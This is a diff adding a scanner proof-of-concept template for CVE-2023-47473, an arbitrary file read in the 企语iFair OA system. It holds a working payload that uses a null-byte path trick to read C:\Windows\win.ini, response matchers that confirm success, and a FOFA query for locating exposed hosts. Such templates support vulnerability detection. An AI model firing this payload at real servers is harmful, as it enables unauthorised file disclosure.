@@ -1,0 +1,25 @@
+id: poc-yaml-qiyu-ifair-getuploadimage-jsp-anyfile-read
+info:
+  name: 企语iFair getuploadimage.jsp 任意文件读取漏洞(CVE-2023-47473)
+  severity: high
+  tags:
+  - CVE-2023-47473
+  - 任意文件或目录访问
+  finger: 企语iFair
+  fofa: app="服务社-企语iFair"
+requests:
+- method: GET
+  path: /oa/common/components/upload/getuploadimage.jsp?imageURL=C:\Windows\win.ini%001.png
+  expression: 'status_code == 200 &&
+
+    contains(body,"; for 16-bit app support") &&
+
+    contains(body,"[files]") &&
+
+    contains(headers,"image/jpeg") &&
+
+    !contains(body,"<")
+
+    '
+variables: {}
+transport: http
